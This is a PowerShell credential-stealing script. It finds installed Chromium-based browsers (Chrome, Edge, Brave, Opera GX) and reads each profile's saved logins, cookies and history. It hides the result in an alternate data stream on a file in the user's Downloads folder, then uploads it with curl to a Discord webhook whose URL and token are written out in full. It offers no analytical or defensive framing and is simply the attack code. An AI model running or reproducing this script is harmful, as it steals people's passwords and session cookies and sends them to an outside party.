$ExfilUrl = "https://discord.com/api/webhooks/1466867070695112909/MhqMGm5FD0UCAe44jq3ho441l5uNeAm_233TujTCkc_ESDaCrxiAPSlMujS2DKtckji6"
function EnumerateAppdata {
    $FilePath="$env:USERPROFILE\AppData\Local\"
    $AppDataContents = Get-ChildItem -path $FilePath
    $InstalledBrowsers = @()
    foreach($App in $AppDataContents){
        if ($App.Name -like "Google") {
            $InstalledBrowsers += "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\"
        }
        if ($App.Name -like "Microsoft") {
            $InstalledBrowsers += "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\"
        }
        if ($App.Name -like "BraveSoftware") {
            $InstalledBrowsers += "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\"
        }
        if ($App.Name -like "Opera") {
            $InstalledBrowsers += "$env:USERPROFILE\AppData\Local\Opera Software\Opera GX\User Data\"
        }
    }
    return $InstalledBrowsers
}
$InstalledBrowsers = EnumerateAppdata
Write-Host $InstalledBrowsers.count
$Profiles = @("Default")
$ProfileData =""
$Cookies = ""
$History = ""
foreach ($Folder in $InstalledBrowsers) {
    $FolderName = $Folder.Name
    if ($FolderName -like "Profile*") {
        $Profiles += $FolderName
}
}
foreach ($Browser in $InstalledBrowsers) {
    foreach ($ProfileName in $Profiles) {
        $ProfileData += Get-Content -Path "$Browser\$ProfileName\Login Data"
        $Cookies += Get-Content -Path "$Browser\$ProfileName\Network\Cookies"
        $History += Get-Content -Path "$Browser\$ProfileName\History"
    }
}
$ExfilData = $ProfileData + "\n" + "__________________________________________" + "\n" + $Cookies + "\n" + "__________________________________________" + "\n" + $History
$UserDownloadFiles = Get-ChildItem -Path $env:USERPROFILE\Downloads\*.txt
$GiveMeAFile = $UserDownloadFiles[0]
Set-Content -Path $GiveMeAFile -Stream "HiddenCreds" -Value $ExfilData  
$ExfilFile = (Get-Item $GiveMeAFile).FullName+":HiddenCreds"
$payloadJson = @{
    content="CredDump"
}|ConvertTo-Json
curl.exe -F "payload_json=$payloadJson" -F "file1=@$ExfilFile" $ExfilUrl
